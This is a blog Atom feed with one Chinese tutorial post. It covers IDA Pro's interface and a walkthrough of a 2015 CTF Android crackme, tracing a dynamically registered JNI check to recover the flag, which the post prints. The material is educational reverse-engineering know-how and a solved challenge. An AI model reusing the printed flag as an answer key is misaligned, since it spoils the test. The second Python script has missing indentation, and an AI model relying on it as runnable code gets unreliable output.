<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Tasfa&#39;s World!</title>
  
  <subtitle>Try to Debug your heart!</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-06-07T08:13:25.177Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Tasfa</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>IDA分析总结</title>
    <link href="http://example.com/2021/05/10/IDA%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/"/>
    <id>http://example.com/2021/05/10/IDA%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/</id>
    <published>2021-05-10T06:45:11.000Z</published>
    <updated>2021-06-07T08:13:25.177Z</updated>
    
    <content type="html"><![CDATA[<h3 id="整体界面"><a href="#整体界面" class="headerlink" title="整体界面"></a>整体界面</h3><p><img src="/Users/tasfa/Desktop/%E6%A1%8C%E9%9D%A2/android%E5%9F%B9%E8%AE%AD&%E5%88%86%E4%BA%AB/%E9%83%A8%E9%97%A8%E5%9F%B9%E8%AE%AD/class3/ida_main.png"></p><p><strong>File , Edit , Jump , Search , View , Debugger , Options , Windows , Help</strong> 9个Tab菜单</p><ul><li>1.File 文件操作相关、脚本操作相关、snapshot相关操作</li><li>2.Edit 功能比较多，主要涉及修改查询注释等</li><li>3.Jump 是用来跳转的，可以有很多种类型的跳转，比如跳转到上一个位置或者下一个位置，跳转到某个指定的地址。还可以根据名字，函数来进行跳转，跳转到一个新的窗口，跳转某一个偏移量等等</li><li>4.Serach 搜索相关操作</li><li>5.View 是用来选择显示方式的，或者显示某一特定模块信息的。比如以树形逻辑图显示，或者16进制形式显示。还可以单独显示某一特定信息，比如输入或者输出表等。</li><li>6.Debugger 动态调试</li><li>7.Options 在这里可以进行一下常规性的设置</li><li>8.Windows 窗口相关的一些操作</li><li>9.Help 使用IDA的一些帮助文档，检查更新等等。</li></ul><span id="more"></span><h3 id="加载文件界面"><a href="#加载文件界面" class="headerlink" title="加载文件界面"></a>加载文件界面</h3><p><img src="/Users/tasfa/Desktop/%E6%A1%8C%E9%9D%A2/android%E5%9F%B9%E8%AE%AD&%E5%88%86%E4%BA%AB/%E9%83%A8%E9%97%A8%E5%9F%B9%E8%AE%AD/class3/load_file.png"></p><h3 id="加载后界面"><a href="#加载后界面" class="headerlink" title="加载后界面"></a>加载后界面</h3><p><img src="/Users/tasfa/Desktop/%E6%A1%8C%E9%9D%A2/android%E5%9F%B9%E8%AE%AD&%E5%88%86%E4%BA%AB/%E9%83%A8%E9%97%A8%E5%9F%B9%E8%AE%AD/class3/ida_load_in.png"></p><ul><li>Function window:列举了IDA识别的每一个函数，<strong>双击</strong>函数可实现跳转。</li><li>IDA View-A:反汇编窗口，分为图形模式与文本模式，通过**空格(space)**可以进行切换。</li><li>Hex View-1:十六进制窗口，与IDA View进行配套，通过右键可以调整数据展示，<strong>F2快捷键</strong>可以修改数据（常用于动态调试 nop 命令 – 00 00 A0 E1）。</li><li>Structures:数据结构窗口，主要是应用自定义实现的一些数据结构体</li><li>Enums:枚举数窗口，显示一些枚举值</li><li>Imports:导入窗口，列出文件导入的函数，即调用的外部函数</li><li>Exports:导出窗口，列出文件的入口点，双击导出条目可实现跳转。</li><li>Strings:字符串窗口，<strong>Shift + F12</strong> 显示从文件中提取出来的字符串以及字符串所在地址，双击导出条目可实现跳转。右键Setup 可以修改匹配条件（Ignore instructions/data definitions 忽略指令/数据定义，勾选此项，会使IDA扫描指令和现有数据定义中的字符串）</li><li>Function Calls:函数调用窗口，可以看到所有调用该函数的位置和当前函数做出的全部调用</li><li>Output window:日志输出窗口，命令结果输出窗口，脚本结果输出窗口等</li><li>其他子窗口:</li></ul><p><img src="/Users/tasfa/Desktop/%E6%A1%8C%E9%9D%A2/android%E5%9F%B9%E8%AE%AD&%E5%88%86%E4%BA%AB/%E9%83%A8%E9%97%A8%E5%9F%B9%E8%AE%AD/class3/view.png"></p><h3 id="ToolBar工具栏"><a href="#ToolBar工具栏" class="headerlink" title="ToolBar工具栏"></a>ToolBar工具栏</h3><p><img src="/Users/tasfa/Desktop/%E6%A1%8C%E9%9D%A2/android%E5%9F%B9%E8%AE%AD&%E5%88%86%E4%BA%AB/%E9%83%A8%E9%97%A8%E5%9F%B9%E8%AE%AD/class3/tab_bar.png"></p><p>主要涉及一些快捷操作，方便使用者进行快捷操作</p><p>可在<strong>Edit–&gt;Toolbar</strong>中选择自定义的工具栏</p><h3 id="Navigation-Band导航条"><a href="#Navigation-Band导航条" class="headerlink" title="Navigation Band导航条"></a>Navigation Band导航条</h3><p><img src="/Users/tasfa/Desktop/%E6%A1%8C%E9%9D%A2/android%E5%9F%B9%E8%AE%AD&%E5%88%86%E4%BA%AB/%E9%83%A8%E9%97%A8%E5%9F%B9%E8%AE%AD/class3/fastNavbar.png"></p><ul><li>颜色条对应下面有颜色的注释，如蓝色:常规函数等</li><li>最右边为可选择的匹配和标记项，可标记如入口点等等</li><li>Options–&gt;colos–&gt;Navigation Band可更改自定义的颜色</li></ul><h3 id="IDA实战分析"><a href="#IDA实战分析" class="headerlink" title="IDA实战分析"></a>IDA实战分析</h3><h3 id="基本方法"><a href="#基本方法" class="headerlink" title="基本方法"></a>基本方法</h3><p>静态分析原生层程序基本的过程如下</p><ol><li>直接解压提取 so 文件(/lib文件夹)</li><li>ida 反编译 so 文件阅读Arm汇编or反汇编代码</li><li>根据 java 层的代码来分析 so 代码。</li><li>根据 so 代码的逻辑辅助整个程序的分析。</li></ol><h3 id="原生层静态分析例子"><a href="#原生层静态分析例子" class="headerlink" title="原生层静态分析例子"></a>原生层静态分析例子</h3><h4 id="2015-福建海峡两岸CTF-APK逆向-逆向试试吧"><a href="#2015-福建海峡两岸CTF-APK逆向-逆向试试吧" class="headerlink" title="2015-福建海峡两岸CTF-APK逆向,逆向试试吧"></a>2015-福建海峡两岸CTF-APK逆向,逆向试试吧</h4><h4 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h4><p>利用jadx反编译apk，确定应用的主活动</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="attr">xmlns:app</span>=<span class="string">&quot;http://schemas.android.com/apk/res-auto&quot;</span> <span class="attr">android:versionCode</span>=<span class="string">&quot;1&quot;</span> <span class="attr">android:versionName</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">package</span>=<span class="string">&quot;com.example.mobicrackndk&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-sdk</span> <span class="attr">android:minSdkVersion</span>=<span class="string">&quot;8&quot;</span> <span class="attr">android:targetSdkVersion</span>=<span class="string">&quot;17&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/AppTheme&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:icon</span>=<span class="string">&quot;@drawable/ic_launcher&quot;</span> <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;com.example.mobicrackndk.CrackMe&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><p>程序的主活动为 com.example.mobicrackndk.CrackMe。</p><h4 id="分析主活动"><a href="#分析主活动" class="headerlink" title="分析主活动"></a>分析主活动</h4><p>程序的基本情况就是利用 native 函数 testFlag 判断用户传入的 pwdEditText 是否满足要求。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">boolean</span> <span class="title">testFlag</span><span class="params">(String str)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">  System.loadLibrary(<span class="string">&quot;mobicrackNDK&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">  setContentView((<span class="keyword">int</span>) R.layout.activity_crack_me);</span><br><span class="line">  <span class="keyword">this</span>.inputButton = (Button) findViewById(R.id.input_button);</span><br><span class="line">  <span class="keyword">this</span>.pwdEditText = (EditText) findViewById(R.id.pwd);</span><br><span class="line">  <span class="keyword">this</span>.inputButton.setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">      CrackMe.<span class="keyword">this</span>.input = CrackMe.<span class="keyword">this</span>.pwdEditText.getText().toString();</span><br><span class="line">      <span class="keyword">if</span> (CrackMe.<span class="keyword">this</span>.input == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (CrackMe.<span class="keyword">this</span>.testFlag(CrackMe.<span class="keyword">this</span>.input)) &#123;</span><br><span class="line">        Toast.makeText(CrackMe.<span class="keyword">this</span>, CrackMe.<span class="keyword">this</span>.input, <span class="number">1</span>).show();</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Toast.makeText(CrackMe.<span class="keyword">this</span>, <span class="string">&quot;Wrong flag&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="分析so文件"><a href="#分析so文件" class="headerlink" title="分析so文件"></a>分析so文件</h4><p>自然我们首先会去直接找 testFlag 函数，凡是并没有直接找到。我们只好首先分析 JNI_Onload 函数，如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> __fastcall <span class="title">JNI_OnLoad</span><span class="params">(JNIEnv *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  JNIEnv *v1; <span class="comment">// r4</span></span><br><span class="line">  JNIEnv *env; <span class="comment">// r5</span></span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// r7</span></span><br><span class="line">  <span class="keyword">int</span> class_; <span class="comment">// r1</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v5; <span class="comment">// r1</span></span><br><span class="line">  JNIEnv *v7; <span class="comment">// [sp+Ch] [bp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  v1 = a1;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;JNI_OnLoad&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( ((<span class="keyword">int</span> (__fastcall *)(JNIEnv *, JNIEnv **, <span class="keyword">signed</span> <span class="keyword">int</span>))(*v1)-&gt;FindClass)(v1, &amp;v7, <span class="number">65540</span>) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  env = v7;</span><br><span class="line">  v3 = classPathName[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">fprintf</span>((FILE *)((<span class="keyword">char</span> *)&amp;_sF + <span class="number">168</span>), <span class="string">&quot;RegisterNatives start for &#x27;%s&#x27;&quot;</span>, classPathName[<span class="number">0</span>]);</span><br><span class="line">  class_ = ((<span class="keyword">int</span> (__fastcall *)(JNIEnv *, <span class="keyword">char</span> *))(*env)-&gt;FindClass)(env, v3);</span><br><span class="line">  <span class="keyword">if</span> ( !class_ )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="string">&quot;Native registration unable to find class &#x27;%s&#x27;&quot;</span>;</span><br><span class="line">LABEL_6:</span><br><span class="line">    <span class="built_in">fprintf</span>((FILE *)((<span class="keyword">char</span> *)&amp;_sF + <span class="number">168</span>), v5, v3);</span><br><span class="line">LABEL_7:</span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;GetEnv failed&quot;</span>, (FILE *)((<span class="keyword">char</span> *)&amp;_sF + <span class="number">168</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( ((<span class="keyword">int</span> (__fastcall *)(JNIEnv *, <span class="keyword">int</span>, <span class="keyword">char</span> **, <span class="keyword">signed</span> <span class="keyword">int</span>))(*env)-&gt;RegisterNatives)(env, class_, off_400C, <span class="number">2</span>) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="string">&quot;RegisterNatives failed for &#x27;%s&#x27;&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">65540</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现，程序在这里动态注册了类和相应的函数 off_400C。仔细看一下该函数</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.data:0000400C off_400C        DCD aTestflag           ; DATA XREF: JNI_OnLoad+68↑o</span><br><span class="line">.data:0000400C                                         ; .text:off_1258↑o</span><br><span class="line">.data:0000400C                                         ; &quot;testFlag&quot;</span><br><span class="line">.data:00004010                 DCD aLjavaLangStrin_0   ; &quot;(Ljava/lang/String;)Z&quot;</span><br><span class="line">.data:00004014                 DCD abcdefghijklmn+1</span><br><span class="line">.data:00004018                 DCD aHello              ; &quot;hello&quot;</span><br><span class="line">.data:0000401C                 DCD aLjavaLangStrin_1   ; &quot;()Ljava/lang/String;&quot;</span><br><span class="line">.data:00004020                 DCD native_hello+1</span><br><span class="line">.data:00004020 ; .data         ends</span><br></pre></td></tr></table></figure><p>可以发现，确实就是 testflag 函数，其对应的函数名为 abcdefghijklmn。</p><h4 id="分析abcdefghijklmn"><a href="#分析abcdefghijklmn" class="headerlink" title="分析abcdefghijklmn"></a>分析abcdefghijklmn</h4><p>可以发现，程序主要在三个部分对输入进行判断和计算</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> __fastcall <span class="title">abcdefghijklmn</span><span class="params">(JNIEnv *a1, <span class="keyword">int</span> a2, <span class="keyword">void</span> *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *input; <span class="comment">// r6</span></span><br><span class="line">  JNIEnv *env; <span class="comment">// r7</span></span><br><span class="line">  _BOOL4 rel; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">size_t</span> i; <span class="comment">// r6</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v7; <span class="comment">// r2</span></span><br><span class="line">  jmethodID clackeyID; <span class="comment">// r2</span></span><br><span class="line">  <span class="keyword">int</span> keyID; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">void</span> *key_; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *key; <span class="comment">// r5</span></span><br><span class="line">  jclass class_calc; <span class="comment">// [sp+4h] [bp-C4h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *password; <span class="comment">// [sp+8h] [bp-C0h]</span></span><br><span class="line">  <span class="keyword">char</span> firstPart[<span class="number">8</span>]; <span class="comment">// [sp+14h] [bp-B4h]</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// [sp+1Ch] [bp-ACh]</span></span><br><span class="line">  <span class="keyword">char</span> secondPart[<span class="number">8</span>]; <span class="comment">// [sp+20h] [bp-A8h]</span></span><br><span class="line">  <span class="keyword">char</span> v18; <span class="comment">// [sp+28h] [bp-A0h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+2Ch] [bp-9Ch]</span></span><br><span class="line"></span><br><span class="line">  input = a3;</span><br><span class="line">  env = a1;</span><br><span class="line">  <span class="keyword">if</span> ( !jniEnv )</span><br><span class="line">    jniEnv = a1;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x80</span>u);</span><br><span class="line">  password = (*jniEnv)-&gt;GetStringUTFChars(jniEnv, input, <span class="number">0</span>);</span><br><span class="line">  rel = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(password) == <span class="number">16</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      firstPart[i] = password[i] - i;</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( i != <span class="number">8</span> );                           <span class="comment">// i==8的时候退出</span></span><br><span class="line">    rel = <span class="number">0</span>;</span><br><span class="line">    v16 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(seed[<span class="number">0</span>], firstPart) )          <span class="comment">// QflMn`fH</span></span><br><span class="line">    &#123;</span><br><span class="line">      class_calc = (*jniEnv)-&gt;FindClass(jniEnv, <span class="string">&quot;com/example/mobicrackndk/Calc&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !class_calc )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = <span class="string">&quot;class,failed&quot;</span>;</span><br><span class="line">LABEL_11:</span><br><span class="line">        _android_log_print(<span class="number">4</span>, <span class="string">&quot;log&quot;</span>, v7);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      clackeyID = (*jniEnv)-&gt;GetStaticMethodID(jniEnv, class_calc, <span class="string">&quot;calcKey&quot;</span>, <span class="string">&quot;()V&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !clackeyID )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = <span class="string">&quot;method,failed&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">      &#125;</span><br><span class="line">      _JNIEnv::CallStaticVoidMethod(jniEnv, class_calc, clackeyID);</span><br><span class="line">      keyID = ((<span class="keyword">int</span> (__fastcall *)(JNIEnv *, jclass, <span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *))(*env)-&gt;GetStaticFieldID)(</span><br><span class="line">                env,</span><br><span class="line">                class_calc,</span><br><span class="line">                <span class="string">&quot;key&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Ljava/lang/String;&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !keyID )</span><br><span class="line">        _android_log_print(<span class="number">4</span>, <span class="string">&quot;log&quot;</span>, <span class="string">&quot;fid,failed&quot;</span>);</span><br><span class="line">      key_ = (<span class="keyword">void</span> *)((<span class="keyword">int</span> (__fastcall *)(JNIEnv *, jclass, <span class="keyword">int</span>))(*env)-&gt;GetStaticObjectField)(env, class_calc, keyID);<span class="comment">// forceCallType</span></span><br><span class="line">      key = (*jniEnv)-&gt;GetStringUTFChars(jniEnv, key_, <span class="number">0</span>);<span class="comment">// ,ZHVW^7c</span></span><br><span class="line">      <span class="keyword">while</span> ( i &lt; <span class="built_in">strlen</span>(key) + <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        secondPart[i - <span class="number">8</span>] = password[i] - i;</span><br><span class="line">        ++i;</span><br><span class="line">      &#125;</span><br><span class="line">      v18 = <span class="number">0</span>;</span><br><span class="line">      rel = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">strcmp</span>(key, secondPart) &lt;= <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> rel;                                   </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>并在之后获得了key的内容。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String key;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">calcKey</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        key = <span class="keyword">new</span> StringBuffer(<span class="string">&quot;c7^WVHZ,&quot;</span>).reverse().toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h4><p>根据这三个判断，我们可以得到输入的字符串内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;QflMn`fH,ZHVW^7c&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> idx,c <span class="keyword">in</span> <span class="built_in">enumerate</span>(s):</span><br><span class="line">    flag +=<span class="built_in">chr</span>(<span class="built_in">ord</span>(c)+idx)</span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure><p>结果如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QgnPrelO4cRackEr</span><br></pre></td></tr></table></figure><p>输入之后并不对。</p><h4 id="再次分析"><a href="#再次分析" class="headerlink" title="再次分析"></a>再次分析</h4><p>想到这里就要考虑下，程序是不是在哪里修改了对应的字符串。这里首先看一下seed。按 x 进行交叉引用，发现其在 _init_my 中使用了，如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> _init_my()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">size_t</span> i; <span class="comment">// r7</span></span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">size_t</span> result; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = seed[<span class="number">0</span>];</span><br><span class="line">    result = <span class="built_in">strlen</span>(seed[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    t[i] = v1[i] - <span class="number">3</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  seed[<span class="number">0</span>] = t;</span><br><span class="line">  byte_4038 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以最初程序对 seed 进行了修改。</p><h4 id="再次获取flag"><a href="#再次获取flag" class="headerlink" title="再次获取flag"></a>再次获取flag</h4><p>修改脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;QflMn`fH,ZHVW^7c&quot;</span></span><br><span class="line"> </span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">flag = flag + <span class="built_in">chr</span>(<span class="built_in">ord</span>(s[i]) - <span class="number">3</span> + i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>,<span class="number">16</span>):</span><br><span class="line">flag = flag + <span class="built_in">chr</span>(<span class="built_in">ord</span>(s[i])  + i)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;flag: &quot;</span> + flag</span><br></pre></td></tr></table></figure><p>flag 如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  2015-海峡两岸一个APK，逆向试试吧 python exp.py</span><br><span class="line">NdkMobiL4cRackEr</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>《IDA Pro权威指南》</p>]]></content>
    
    
